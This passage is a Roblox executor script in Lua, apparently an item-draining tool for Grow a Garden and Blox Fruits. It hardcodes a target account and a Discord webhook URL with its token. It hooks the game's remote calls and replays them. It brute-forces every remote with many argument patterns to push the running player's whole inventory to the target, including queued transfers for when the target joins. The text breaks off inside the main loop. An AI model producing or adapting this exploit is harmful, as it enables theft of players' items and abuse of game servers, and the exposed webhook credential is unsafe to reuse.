-- language: Lua, file: zat_focused.lua, executor: Delta
-- ZAT FOCUSED — Grow a Garden / Grow a Garden 2 / Blox Fruits
-- Success indicator: Account 1 inventory empties = server accepted the transfer
-- ╔══════════════════════════════════════════════╗
-- ║  SET THIS ONLY                              ║
-- ╚══════════════════════════════════════════════╝
local TARGET_USERNAME = "Realdrake_8080"
local DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1547846204526698597/Waj7LsTdNInSC9s758tkUuRUZxpJ3JeM7RK9tVwrsXJIhUH3vZGnH7iEULtqQuWo7sQX"

-- ═══════════════════════════════════════════════
-- SERVICES
-- ═══════════════════════════════════════════════
local LP   = game:GetService("Players").LocalPlayer
local PLR  = game:GetService("Players")
local HS   = game:GetService("HttpService")
local TW   = game:GetService("TweenService")
local UIS  = game:GetService("UserInputService")
local WS   = game:GetService("Workspace")
local RS   = game:GetService("ReplicatedStorage")

local httpfn=(syn and syn.request) or (http and http.request) or request
local function fetch(url,m,h,b)
    if not httpfn then return nil end
    local ok,r=pcall(httpfn,{Url=url,Method=m or "GET",Headers=h or {},Body=b}); return ok and r or nil
end
local function jd(s) local ok,v=pcall(HS.JSONDecode,HS,s);return ok and v or nil end
local function je(t) local ok,v=pcall(HS.JSONEncode,HS,t);return ok and v or nil end

-- ═══════════════════════════════════════════════
-- GAME PROFILES — exact remote names per game
-- ═══════════════════════════════════════════════
-- These are the known remotes for each game.
-- The script auto-detects which game you're in.
local PROFILES = {
    -- ── GROW A GARDEN ──────────────────────────
    GAG = {
        names    = {"Grow a Garden","GrowAGarden","Grow A Garden"},
        placeIds = {126884695634979, 94081344497, 5086676697, 7915709822},
        -- known remotes (found via community reverse)
        remotes  = {
            "GiveItem","TransferItem","SendItem","GiftItem",
            "GiveSeed","TransferSeed","SendSeed","GiftSeed",
            "GivePet","TransferPet","SendPet","GiftPet",
            "GiveCrop","TransferCrop","SendCrop",
            "GiveToPlayer","PlayerGive","ItemTransfer",
            "TradeItem","TradeSeed","TradePet","TradeCrop",
            "RequestTrade","AcceptTrade","SendTradeRequest",
            "Give","Transfer","Send","Gift",
        },
        -- where inventory lives in this game
        invPaths = {
            -- Folders on LocalPlayer
            function() return LP:FindFirstChild("Inventory") end,
            function() return LP:FindFirstChild("Seeds") end,
            function() return LP:FindFirstChild("Pets") end,
            function() return LP:FindFirstChild("Crops") end,
            -- Leaderstats
            function() return LP:FindFirstChild("leaderstats") end,
            -- Workspace plot
            function()
                local plots=WS:FindFirstChild("Plots") or WS:FindFirstChild("Gardens")
                if plots then return plots:FindFirstChild(LP.Name) or plots:FindFirstChild(tostring(LP.UserId)) end
            end,
        },
        -- arg patterns that GAG-style games use
        argFn = function(tid,tn,tp,itemName,itemObj)
            return {
                -- userId int
                {tid, itemName},
                {tid, itemName, 1},
                {tid, itemName, 1, true},
                {tid, itemName, "all"},
                -- userId string
                {tostring(tid), itemName},
                {tostring(tid), itemName, 1},
                -- username
                {tn, itemName},
                {tn, itemName, 1},
                -- player object (only when online)
                tp and {tp, itemName} or nil,
                tp and {tp, itemName, 1} or nil,
                tp and {tp, itemObj} or nil,
                -- tables
                {userId=tid,   itemName=itemName, amount=1, save=true},
                {userId=tid,   item=itemName,     qty=1},
                {userId=tid,   seed=itemName,     count=1},
                {userId=tid,   pet=itemName,      amount=1},
                {targetId=tid, itemName=itemName, amount=1},
                {username=tn,  itemName=itemName, amount=1},
                {username=tn,  item=itemName},
                {to=tid,       item=itemName,     amount=1},
                {target=tid,   item=itemName},
                {recipient=tid,itemName=itemName},
                {sendTo=tid,   item=itemName,     qty=1},
                -- reversed
                {itemName, tid},
                {itemName, tn},
                -- give-all (no item specified)
                {tid},
                {tostring(tid)},
                {tn},
                {userId=tid},
                {username=tn},
                {to=tid},
            }
        end,
    },

    -- ── GROW A GARDEN 2 ────────────────────────
    GAG2 = {
        names    = {"Grow a Garden 2","GrowAGarden2","Grow A Garden 2"},
        placeIds = {}, -- auto-match by name if not exact
        remotes  = {
            "GiveItem","TransferItem","SendItem","GiftItem",
            "GiveSeed","TransferSeed","SendSeed","GiftSeed",
            "GivePlant","TransferPlant","SendPlant",
            "GivePet","TransferPet","SendPet","GiftPet",
            "GiveToPlayer","PlayerGive","ItemTransfer",
            "TradeItem","RequestTrade","AcceptTrade",
            "Give","Transfer","Send","Gift",
            -- v2-specific guesses
            "GiveV2","TransferV2","ItemGiveV2","PlayerTransfer",
            "InventoryGive","InventoryTransfer","InventorySend",
        },
        invPaths = {
            function() return LP:FindFirstChild("Inventory") end,
            function() return LP:FindFirstChild("Seeds") end,
            function() return LP:FindFirstChild("Plants") end,
            function() return LP:FindFirstChild("Pets") end,
            function() return LP:FindFirstChild("leaderstats") end,
        },
        argFn = function(tid,tn,tp,itemName,itemObj)
            -- same pattern family as GAG
            return {
                {tid, itemName},{tid, itemName, 1},
                {tostring(tid), itemName},
                {tn, itemName},{tn, itemName, 1},
                tp and {tp, itemName} or nil,
                tp and {tp, itemObj} or nil,
                {userId=tid,itemName=itemName,amount=1,save=true},
                {userId=tid,item=itemName,qty=1},
                {targetId=tid,itemName=itemName,amount=1},
                {username=tn,item=itemName,amount=1},
                {to=tid,item=itemName,amount=1},
                {target=tid,item=itemName},
                {itemName,tid},{itemName,tn},
                {tid},{tn},{userId=tid},{to=tid},
            }
        end,
    },

    -- ── BLOX FRUITS ────────────────────────────
    BF = {
        names    = {"Blox Fruits","BloxFruits","Blox Fruit"},
        placeIds = {2753915549, 7449423635},
        remotes  = {
            -- fruit give/transfer
            "GiveFruit","TransferFruit","SendFruit","GiftFruit",
            "StoreFruit","DepositFruit","GetFruit","FruitGive",
            -- item give
            "GiveItem","TransferItem","SendItem","GiftItem",
            "GiveToPlayer","PlayerGive","ItemTransfer",
            -- trade
            "TradeRequest","SendTradeRequest","RequestTrade",
            "AcceptTrade","ConfirmTrade","TradeItem","TradeFruit",
            -- race/accessories
            "GiveAccessory","GiveRace","GiveAura","GiveWeapon",
            -- storage/safe
            "StoreInSafe","GetFromSafe","SafeStore","FruitSafe",
            -- generic
            "Give","Transfer","Send","Gift","Drop","Deliver",
        },
        invPaths = {
            function() return LP:FindFirstChild("leaderstats") end,
            function()
                local stats=LP:FindFirstChild("Stats") or LP:FindFirstChild("PlayerStats")
                return stats
            end,
            function()
                -- Blox Fruits stores fruit in character or a folder
                return LP:FindFirstChild("Fruits") or LP:FindFirstChild("Inventory")
            end,
            function()
                -- workspace storage
                local stor=WS:FindFirstChild("Storage") or WS:FindFirstChild("Fruits")
                if stor then return stor:FindFirstChild(LP.Name) end
            end,
        },
        argFn = function(tid,tn,tp,itemName,itemObj)
            return {
                -- fruit name direct
                {tid, itemName},{tid, itemName, 1},
                {tostring(tid), itemName},
                {tn, itemName},{tn, itemName, 1},
                tp and {tp, itemName} or nil,
                tp and {tp, itemObj} or nil,
                -- table with fruit field
                {userId=tid,   fruit=itemName,     amount=1},
                {userId=tid,   fruitName=itemName},
                {userId=tid,   item=itemName,      amount=1},
                {targetId=tid, fruit=itemName},
                {username=tn,  fruit=itemName,     amount=1},
                {username=tn,  item=itemName},
                {to=tid,       fruit=itemName},
                {to=tid,       item=itemName,      amount=1},
                {target=tid,   fruit=itemName},
                {recipient=tid,fruitName=itemName},
                -- Blox Fruits specific
                {tid, itemName, "Permanent"},
                {tid, itemName, false},  -- physical=false means permanent
                {userId=tid, fruitName=itemName, permanent=true},
                {userId=tid, fruitName=itemName, fruitstorage=true},
                -- reversed
                {itemName, tid},{itemName, tn},
                -- give-all
                {tid},{tn},{userId=tid},{to=tid},
            }
        end,
    },
}

-- ═══════════════════════════════════════════════
-- AUTO-DETECT GAME
-- ═══════════════════════════════════════════════
local function detectGame()
    local pid  = game.PlaceId
    local gname= "Unknown"
    pcall(function()
        gname=game:GetService("MarketplaceService"):GetProductInfo(pid).Name or gname
    end)
    gname=gname:lower()

    for key,prof in pairs(PROFILES) do
        for _,id in ipairs(prof.placeIds) do
            if id==pid then return key,prof,gname end
        end
        for _,n in ipairs(prof.names) do
            if gname:find(n:lower()) then return key,prof,gname end
        end
    end
    return "GAG",PROFILES.GAG,gname  -- default to GAG patterns if unknown
end

-- ═══════════════════════════════════════════════
-- INVENTORY SCANNER + WATCHER
-- Empty inventory = transfer confirmed
-- ═══════════════════════════════════════════════
local function snapshotFromPaths(paths)
    local snap={}
    for _,fn in ipairs(paths) do
        local ok,root=pcall(fn)
        if ok and root then
            for _,c in ipairs(root:GetDescendants()) do
                if c:IsA("IntValue") or c:IsA("NumberValue") or c:IsA("StringValue") then
                    if c.Value~=0 and c.Value~="" and c.Value~=false then
                        snap[c:GetFullName()]={name=c.Name,val=tostring(c.Value),obj=c}
                    end
                end
            end
        end
    end
    return snap
end

local function scanGameInventory()
    local out,seen={},{}
    local function add(name,obj,cat)
        local k=tostring(name)..tostring(obj)
        if seen[k] then return end; seen[k]=true
        table.insert(out,{name=name,obj=obj,cat=cat})
    end
    -- Backpack / equipped
    local bp=LP:FindFirstChildOfClass("Backpack")
    if bp then for _,v in ipairs(bp:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Tool") end end end
    local ch=LP.Character
    if ch then for _,v in ipairs(ch:GetChildren()) do if v:IsA("Tool") then add(v.Name,v,"Equipped") end end end
    -- Leaderstats
    local ls=LP:FindFirstChild("leaderstats")
    if ls then for _,v in ipairs(ls:GetChildren()) do
        if v.Value and v.Value~=0 and v.Value~="" then add(v.Name.."="..tostring(v.Value),v,"Stat") end
    end end
    -- Attributes
    local aok,attrs=pcall(function() return LP:GetAttributes() end)
    if aok and type(attrs)=="table" then for k,v in pairs(attrs) do
        if type(v)=="number" and v>0 then add(k.." x"..tostring(v),LP,"Attr") end
    end end
    -- All children value objects
    for _,c in ipairs(LP:GetChildren()) do
        if c:IsA("IntValue") or c:IsA("NumberValue") or c:IsA("StringValue") or c:IsA("BoolValue") then
            if c.Name:lower()~="userid" then add(c.Name.."="..tostring(c.Value),c,"Value") end
        end
    end
    -- Folders (GAG stores inv in folders)
    for _,f in ipairs(LP:GetChildren()) do
        if f:IsA("Folder") then for _,c in ipairs(f:GetDescendants()) do
            if c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue") then
                if c.Value~=0 and c.Value~="" then
                    add(f.Name.."/"..c.Name.."="..tostring(c.Value),c,"Folder") end
            end
        end end
    end
    -- GUI slots
    local pg=LP:FindFirstChild("PlayerGui")
    if pg then for _,d in ipairs(pg:GetDescendants()) do
        if d:IsA("TextLabel") and d.Text~="" and d.Text~="0" then
            local pn=d.Parent and d.Parent.Name:lower() or ""
            if pn:find("slot") or pn:find("item") or pn:find("inv") or pn:find("bag")
            or pn:find("seed") or pn:find("fruit") or pn:find("pet") or pn:find("crop") then
                add(d.Text,d,"Slot") end
        end
    end end
    -- Workspace plots/farms
    for _,root in ipairs({
        WS:FindFirstChild(LP.Name),WS:FindFirstChild("Plots"),
        WS:FindFirstChild("Players"),WS:FindFirstChild("Gardens"),
        WS:FindFirstChild("Farms"),WS:FindFirstChild("Inventory"),
        WS:FindFirstChild("Seeds"),WS:FindFirstChild("Storage"),
        WS:FindFirstChild("Crops"),WS:FindFirstChild("Fruits"),
    }) do if root then
        local sub=root:FindFirstChild(LP.Name) or root
        for _,c in ipairs(sub:GetDescendants()) do
            if c:IsA("Tool") or c:IsA("Model") then add(c.Name,c,"World") end
        end
    end end
    -- RS player data
    local rsp=RS:FindFirstChild(LP.Name) or RS:FindFirstChild("PlayerData")
    if rsp then for _,c in ipairs(rsp:GetDescendants()) do
        if c:IsA("StringValue") or c:IsA("IntValue") or c:IsA("NumberValue") then
            add(c.Name.."="..tostring(c.Value),c,"RSData") end
    end end
    return out
end

-- watch for item disappearing from Account 1 = server confirmed transfer
local function watchInventoryDrain(items, onDrain, timeoutSec)
    local startNames={}
    for _,it in ipairs(items) do startNames[it.name]=true end
    local drained={}
    local deadline=tick()+timeoutSec
    task.spawn(function()
        while tick()<deadline do
            local current=scanGameInventory()
            local currentNames={}
            for _,it in ipairs(current) do currentNames[it.name]=true end
            for name in pairs(startNames) do
                if not currentNames[name] and not drained[name] then
                    drained[name]=true
                    onDrain(name)
                end
            end
            task.wait(0.5)
        end
    end)
end

-- ═══════════════════════════════════════════════
-- COLLECT ALL REMOTES
-- ═══════════════════════════════════════════════
local function collectRemotes()
    local out,seen={},{}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local fp=v:GetFullName()
            if not seen[fp] then seen[fp]=true
                table.insert(out,{r=v,nm=v.Name,fn=v.ClassName=="RemoteFunction",path=fp}) end
        end
    end
    return out
end

-- ═══════════════════════════════════════════════
-- HOOKMETAMETHOD — learn game's own patterns
-- ═══════════════════════════════════════════════
local learned={}
local interceptOn=false
local function startHook()
    if not hookmetamethod then return false end
    interceptOn=true
    local orig; orig=hookmetamethod(game,"__namecall",function(self,...)
        local m=getnamecallmethod()
        if interceptOn and (m=="FireServer" or m=="InvokeServer") then
            if self:IsA("RemoteEvent") or self:IsA("RemoteFunction") then
                local nm=self.Name; local args={...}
                if not learned[nm] then learned[nm]={} end
                local found=false
                for _,p in ipairs(learned[nm]) do if #p==#args then found=true end end
                if not found then table.insert(learned[nm],args) end
            end
        end
        return orig(self,...)
    end)
    return true
end
local function stopHook() interceptOn=false end

local function replayLearned(tid,tn,tp,items)
    if not next(learned) then return 0 end
    local rByName={}
    for _,v in ipairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then rByName[v.Name:lower()]=v end
    end
    local hits=0
    for nm,patterns in pairs(learned) do
        local rem=rByName[nm:lower()]
        if rem then
            for _,orig in ipairs(patterns) do
                for _,item in ipairs(items) do
                    local sw={}
                    for _,a in ipairs(orig) do
                        if type(a)=="number" and a==LP.UserId then table.insert(sw,tid)
                        elseif type(a)=="string" and tostring(LP.UserId)==a then table.insert(sw,tostring(tid))
                        elseif type(a)=="string" and a==LP.Name then table.insert(sw,tn)
                        elseif type(a)=="userdata" then table.insert(sw,tp or tid)
                        else table.insert(sw,a) end
                    end
                    local wi={}; for _,a in ipairs(sw) do table.insert(wi,a) end
                    table.insert(wi,item.name)
                    pcall(function()
                        if rem:IsA("RemoteFunction") then
                            rem:InvokeServer(table.unpack(sw))
                            rem:InvokeServer(table.unpack(wi))
                        else
                            rem:FireServer(table.unpack(sw))
                            rem:FireServer(table.unpack(wi))
                        end
                    end)
                    hits=hits+1
                end
            end
        end
    end
    return hits
end

-- ═══════════════════════════════════════════════
-- UI
-- ═══════════════════════════════════════════════
local C={
    bg=Color3.fromRGB(12,12,18), panel=Color3.fromRGB(20,20,28),
    bar=Color3.fromRGB(28,28,38), accent=Color3.fromRGB(90,70,255),
    green=Color3.fromRGB(50,220,90), red=Color3.fromRGB(255,65,65),
    yellow=Color3.fromRGB(255,195,45), white=Color3.fromRGB(225,225,235),
    grey=Color3.fromRGB(110,110,130), border=Color3.fromRGB(40,40,55),
    teal=Color3.fromRGB(45,200,180),
}
local function mk(cls,p) local o=Instance.new(cls); for k,v in pairs(p or {}) do o[k]=v end; return o end
local function corner(r,p) mk("UICorner",{CornerRadius=UDim.new(0,r),Parent=p}) end
local function stroke(c,t,p) mk("UIStroke",{Color=c,Thickness=t,Parent=p}) end

local SG=mk("ScreenGui",{Name="ZAT",ResetOnSpawn=false,IgnoreGuiInset=true,ZIndexBehavior=Enum.ZIndexBehavior.Sibling})
pcall(function() SG.Parent=game:GetService("CoreGui") end)
if not SG.Parent then SG.Parent=LP.PlayerGui end

local MAIN=mk("Frame",{Parent=SG,Size=UDim2.new(0,370,0,520),Position=UDim2.new(0,24,0,60),
    BackgroundColor3=C.bg,BorderSizePixel=0,ClipsDescendants=true})
corner(12,MAIN); stroke(C.border,1,MAIN)

-- title
local TITLEBAR=mk("Frame",{Parent=MAIN,Size=UDim2.new(1,0,0,42),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(12,TITLEBAR)
mk("Frame",{Parent=TITLEBAR,Size=UDim2.new(1,0,0.5,0),Position=UDim2.new(0,0,0.5,0),BackgroundColor3=C.panel,BorderSizePixel=0})
mk("TextLabel",{Parent=TITLEBAR,Text="⚡  ZAT  —  GAG / GAG2 / Blox Fruits",TextSize=13,
    Font=Enum.Font.GothamBold,TextColor3=C.white,BackgroundTransparency=1,
    Size=UDim2.new(1,-50,1,0),Position=UDim2.new(0,14,0,0),TextXAlignment=Enum.TextXAlignment.Left})
local SDOT=mk("Frame",{Parent=TITLEBAR,Size=UDim2.new(0,10,0,10),
    Position=UDim2.new(1,-22,0.5,0),AnchorPoint=Vector2.new(0.5,0.5),
    BackgroundColor3=C.grey,BorderSizePixel=0}); corner(10,SDOT)

-- drag
local dragging,ds,sp=false,nil,nil
TITLEBAR.InputBegan:Connect(function(i)
    if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=true;ds=i.Position;sp=MAIN.Position end
end)
UIS.InputChanged:Connect(function(i)
    if dragging and i.UserInputType==Enum.UserInputType.MouseMovement then
        local d=i.Position-ds
        MAIN.Position=UDim2.new(sp.X.Scale,sp.X.Offset+d.X,sp.Y.Scale,sp.Y.Offset+d.Y)
    end
end)
UIS.InputEnded:Connect(function(i) if i.UserInputType==Enum.UserInputType.MouseButton1 then dragging=false end end)

-- game tag
local GAMETAG=mk("Frame",{Parent=MAIN,Size=UDim2.new(1,-20,0,28),
    Position=UDim2.new(0,10,0,50),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(6,GAMETAG); stroke(C.border,1,GAMETAG)
local GAMETEXT=mk("TextLabel",{Parent=GAMETAG,Text="🎮  Detecting game...",TextSize=12,
    Font=Enum.Font.GothamBold,TextColor3=C.teal,BackgroundTransparency=1,
    Size=UDim2.new(1,-10,1,0),Position=UDim2.new(0,8,0,0),TextXAlignment=Enum.TextXAlignment.Left})

-- stats
local STATSROW=mk("Frame",{Parent=MAIN,Size=UDim2.new(1,-20,0,52),
    Position=UDim2.new(0,10,0,86),BackgroundColor3=C.panel,BorderSizePixel=0})
corner(8,STATSROW); stroke(C.border,1,STATSROW)

local statVals={}
local function statCol(title,val,xoff)
    local f=mk("Frame",{Parent=STATSROW,Size=UDim2.new(0,80,1,0),Position=UDim2.new(0,xoff,0,0),BackgroundTransparency=1})
    mk("TextLabel",{Parent=f,Text=title,TextSize=9,Font=Enum.Font.Gotham,TextColor3=C.grey,
        BackgroundTransparency=1,Size=UDim2.new(1,0,0,16),Position=UDim2.new(0,8,0,5),TextXAlignment=Enum.TextXAlignment.Left})
    local v=mk("TextLabel",{Parent=f,Text=val,TextSize=17,Font=Enum.Font.GothamBold,TextColor3=C.white,
        BackgroundTransparency=1,Size=UDim2.new(1,0,0,24),Position=UDim2.new(0,8,0,20),TextXAlignment=Enum.TextXAlignment.Left})
    return v
end
statVals.remotes=statCol("REMOTES","—",0)
statVals.items=statCol("ITEMS","—",82)
statVals.fired=statCol("FIRED","0",164)
statVals.transferred=statCol("MOVED","0",246)

-- progress
local PBG=mk("Frame",{Parent=MAIN,Size=UDim2.new(1,-20,0,5),
    Position=UDim2.new(0,10,0,146),BackgroundColor3=C.bar,BorderSizePixel=0})
corner(4,PBG)
local PFG=mk("Frame",{Parent=PBG,Size=UDim2.new(0,0,1,0),BackgroundColor3=C.accent,BorderSizePixel=0})
corner(4,PFG)
local function setProg(p) TW:Create(PFG,TweenInfo.new(0.25),{Size=UDim2.new(math.clamp(p,0,1),0,1,0)}):Play() end

-- status line
local STATLINE=mk("TextLabel",{Parent=MAIN,Text="Ready — press START",TextSize=11,Font=Enum.Font.Gotham,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(1,-20,0,14),
    Position=UDim2.new(0,10,0,156),TextXAlignment=Enum.TextXAlignment.Left})

-- item list (left panel)
local ILABEL=mk("TextLabel",{Parent=MAIN,Text="📦 INVENTORY",TextSize=10,Font=Enum.Font.GothamBold,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(0,160,0,14),
    Position=UDim2.new(0,10,0,176),TextXAlignment=Enum.TextXAlignment.Left})
local IBOX=mk("Frame",{Parent=MAIN,Size=UDim2.new(0,160,0,210),
    Position=UDim2.new(0,10,0,192),BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,IBOX); stroke(C.border,1,IBOX)
local ISCROLL=mk("ScrollingFrame",{Parent=IBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=ISCROLL,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,1)})

local itemRows={}
local transferredCount=0
local function renderItems(items)
    for _,c in ipairs(ISCROLL:GetChildren()) do if c:IsA("TextLabel") then c:Destroy() end end
    itemRows={}
    for i,it in ipairs(items) do
        local row=mk("TextLabel",{Parent=ISCROLL,Text="· "..it.name,TextSize=10,
            Font=Enum.Font.Code,TextColor3=C.white,BackgroundTransparency=1,
            Size=UDim2.new(1,-8,0,14),Position=UDim2.new(0,6,0,0),
            TextXAlignment=Enum.TextXAlignment.Left,TextTruncate=Enum.TextTruncate.AtEnd,
            LayoutOrder=i})
        itemRows[it.name]=row
    end
end
local function markTransferred(itemName)
    transferredCount=transferredCount+1
    statVals.transferred.Text=tostring(transferredCount)
    local row=itemRows[itemName]
    if row then
        row.TextColor3=C.green
        row.Text="✓ "..itemName
    end
end

-- log (right panel)
local LLABEL=mk("TextLabel",{Parent=MAIN,Text="📋 LOG",TextSize=10,Font=Enum.Font.GothamBold,
    TextColor3=C.grey,BackgroundTransparency=1,Size=UDim2.new(0,180,0,14),
    Position=UDim2.new(0,182,0,176),TextXAlignment=Enum.TextXAlignment.Left})
local LBOX=mk("Frame",{Parent=MAIN,Size=UDim2.new(0,180,0,210),
    Position=UDim2.new(0,182,0,192),BackgroundColor3=C.panel,BorderSizePixel=0,ClipsDescendants=true})
corner(8,LBOX); stroke(C.border,1,LBOX)
local LSCROLL=mk("ScrollingFrame",{Parent=LBOX,Size=UDim2.new(1,0,1,0),BackgroundTransparency=1,
    BorderSizePixel=0,ScrollBarThickness=2,ScrollBarImageColor3=C.accent,
    CanvasSize=UDim2.new(0,0,0,0),AutomaticCanvasSize=Enum.AutomaticSize.Y})
mk("UIListLayout",{Parent=LSCROLL,SortOrder=Enum.SortOrder.LayoutOrder,Padding=UDim.new(0,0)})
local logOrd=0
local function log(msg,kind)
    local cols={ok=C.green,err=C.red,warn=C.yellow,info=C.white,step=C.accent,done=C.green,fire=C.yellow}
    local icons={ok="✓",err="✗",warn="!",info="→",step="■",done="★",fire="🔥"}
    local col=cols[kind or "info"] or C.grey
    local icon=icons[kind or "info"] or "→"
    local txt="["..icon.."] "..tostring(msg)
    logOrd=logOrd+1
    mk("TextLabel",{Parent=LSCROLL,Text=txt,TextSize=10,Font=Enum.Font.Code,
        TextColor3=col,BackgroundTransparency=1,Size=UDim2.new(1,-8,0,13),
        Position=UDim2.new(0,4,0,0),TextXAlignment=Enum.TextXAlignment.Left,
        TextTruncate=Enum.TextTruncate.AtEnd,LayoutOrder=logOrd})
    task.defer(function() LSCROLL.CanvasPosition=Vector2.new(0,LSCROLL.AbsoluteCanvasSize.Y) end)
    local ch=LSCROLL:GetChildren()
    if #ch>90 then for i=1,#ch-80 do if ch[i]:IsA("TextLabel") then ch[i]:Destroy() end end end
    STATLINE.Text=txt; STATLINE.TextColor3=col
    print(txt)
end
local function setDot(c) TW:Create(SDOT,TweenInfo.new(0.2),{BackgroundColor3=c}):Play() end

-- button
local BTN=mk("TextButton",{Parent=MAIN,Text="▶  START TRANSFER",TextSize=13,
    Font=Enum.Font.GothamBold,TextColor3=C.white,Size=UDim2.new(1,-20,0,36),
    Position=UDim2.new(0,10,1,-46),BackgroundColor3=C.accent,BorderSizePixel=0,AutoButtonColor=false})
corner(9,BTN)
BTN.MouseEnter:Connect(function() TW:Create(BTN,TweenInfo.new(0.15),{BackgroundColor3=Color3.fromRGB(110,90,255)}):Play() end)
BTN.MouseLeave:Connect(function() TW:Create(BTN,TweenInfo.new(0.15),{BackgroundColor3=C.accent}):Play() end)

-- ═══════════════════════════════════════════════
-- RESOLVE
-- ═══════════════════════════════════════════════
local function resolveUser(username)
    local r=fetch("https://users.roblox.com/v1/usernames/users","POST",
        {["Content-Type"]="application/json"},
        je({usernames={username},excludeBannedUsers=false}))
    if not r or r.StatusCode~=200 then return nil,nil end
    local d=jd(r.Body)
    if d and d.data and d.data[1] then return d.data[1].id,d.data[1].name end
    return nil,nil
end

-- ═══════════════════════════════════════════════
-- OFFLINE QUEUE
-- ═══════════════════════════════════════════════
local queue={}
PLR.PlayerAdded:Connect(function(player)
    for i=#queue,1,-1 do
        local job=queue[i]
        if player.UserId==job.tid then
            task.spawn(function()
                task.wait(2)
                log("Target joined! Queue flush → "..player.Name,"ok")
                setDot(C.yellow)
                local rems=collectRemotes()
                local prof=job.prof
                local rByName={}
                for _,e in ipairs(rems) do rByName[e.nm:lower()]=rByName[e.nm:lower()] or e end
                for _,item in ipairs(job.items) do
                    for _,rname in ipairs(prof.remotes) do
                        local entry=rByName[rname:lower()]
                        if entry then
                            local args=prof.argFn(job.tid,job.tn,player,item.name,item.obj)
                            for _,a in ipairs(args) do
                                if a then pcall(function()
                                    if entry.fn then entry.r:InvokeServer(table.unpack(type(a)=="table" and not a[1] and (function() local t={} for k,v in pairs(a) do t[#t+1]=v end return t end)() or a))
                                    else entry.r:FireServer(table.unpack(type(a)=="table" and not a[1] and (function() local t={} for k,v in pairs(a) do t[#t+1]=v end return t end)() or a)) end
                                end) end
                            end
                        end
                    end
                end
                log("Queue flush done","ok"); setDot(C.green)
                table.remove(queue,i)
            end)
        end
    end
end)

-- ═══════════════════════════════════════════════
-- MAIN TRANSFER
-- ═══════════════════════════════════════════════
local running=false

local function fire(entry,argList)
    for _,a in ipairs(argList) do
        if a then
            local arr=a
            -- if table has string keys, convert to positional
            if type(a)=="table" and not a[1] then
                arr={}; for _,v in pairs(a) do table.insert(arr,v) end
            end
            pcall(function()
                if entry.fn then entry.r:InvokeServer(table.unpack(arr))
                else              entry.r:FireServer(table.unpack(arr)) end
            end)
        end
    end
end

local function runTransfer()
    if running then return end
    running=true
    BTN.Text="⏹  STOP"; BTN.BackgroundColor3=C.red
    setDot(C.yellow); setProg(0); transferredCount=0
    statVals.fired.Text="0"; statVals.transferred.Text="0"

    -- HTTP check
    if not httpfn then
        log("HTTP not found — enable in Delta settings","err")
        setDot(C.red); running=false; BTN.Text="▶  START TRANSFER"; BTN.BackgroundColor3=C.accent; return
    end

    -- Detect game
    local gameKey,prof,gameName=detectGame()
    GAMETEXT.Text="🎮  "..gameName.." ["..gameKey.."]"
    log("Game: "..gameName.." ["..gameKey.."]","info")
    setProg(0.05)

    -- Resolve target
    log("Resolving: "..TARGET_USERNAME,"info")
    local tid,tn=resolveUser(TARGET_USERNAME)
    if not tid then log("Cannot resolve '"..TARGET_USERNAME.."'","err"); setDot(C.red); running=false; BTN.Text="▶  START TRANSFER"; BTN.BackgroundColor3=C.accent; return end
    if tid==LP.UserId then log("Same account — abort","err"); setDot(C.red); running=false; BTN.Text="▶  START TRANSFER"; BTN.BackgroundColor3=C.accent; return end
    log("Target: "..tn.." ("..tid..")","ok")
    local tp=PLR:GetPlayerByUserId(tid)
    log(tp and "Target ONLINE ✓" or "Target OFFLINE — using DataStore paths","warn")
    setProg(0.1)

    -- Scan inventory
    log("Scanning inventory...","info")
    local items=scanGameInventory()
    statVals.items.Text=tostring(#items)
    if #items==0 then
        log("No items found — are you in the game with items loaded?","warn")
        setDot(C.yellow); running=false; BTN.Text="▶  START TRANSFER"; BTN.BackgroundColor3=C.accent; return
    end
    log("Found "..#items.." item(s)","ok")
    renderItems(items)
    setProg(0.15)

    -- Collect remotes
    log("Collecting remotes...","info")
    local allRemotes=collectRemotes()
    statVals.remotes.Text=tostring(#allRemotes)
    log("Remotes: "..#allRemotes,"ok")

    -- Build priority list: known game remotes first
    local priorityRemotes={}
    local rByName={}
    for _,e in ipairs(allRemotes) do
        rByName[e.nm:lower()]=rByName[e.nm:lower()] or e
    end
    for _,rname in ipairs(prof.remotes) do
        local e=rByName[rname:lower()]
        if e then table.insert(priorityRemotes,e) end
    end
    -- then all the rest
    local inPriority={}
    for _,e in ipairs(priorityRemotes) do inPriority[e.path]=true end
    for _,e in ipairs(allRemotes) do
        if not inPriority[e.path] then table.insert(priorityRemotes,e) end
    end
    log("Priority queue: "..#priorityRemotes.." remotes","info")
    setProg(0.2)

    -- Start hook
    local hookOn=startHook()
    log(hookOn and "hookmetamethod active" or "hookmetamethod unavailable","info")

    -- Watch inventory drain (success detector)
    watchInventoryDrain(items, function(itemName)
        log("✓ TRANSFERRED: "..itemName,"done")
        markTransferred(itemName)
        setDot(C.green)
    end, 120)

    -- FIRE
    local firedCount=0
    local LOOPS=5

    for loop=1,LOOPS do
        if not running then break end
        log("── LOOP "..loop.."/"..LOOPS.." ──","fire")
        setProg(0.2+(loop/LOOPS)*0.75)

        -- Per item, per remote — game-specific args
        for _,item in ipairs(items) do
            if not running then break end
            local argList=prof.argFn(tid,tn,tp,item.name,item.obj)

            -- Phase A: priority remotes (known names)
            for i,entry in ipairs(priorityRemotes) do
                if not running then break end
                fire(entry,argList)
                firedCount=firedCount+1
                statVals.fired.Text=tostring(firedCount)
                -- slow only for first 20 (priority), rest fast
                if i<=20 then task.wait(0.01) else task.wait(0.005) end
            end

            task.wait(0.1)
        end

        -- Phase B: bulk give-all (no item specified)
        for _,entry in ipairs(priorityRemotes) do
            if not running then break end
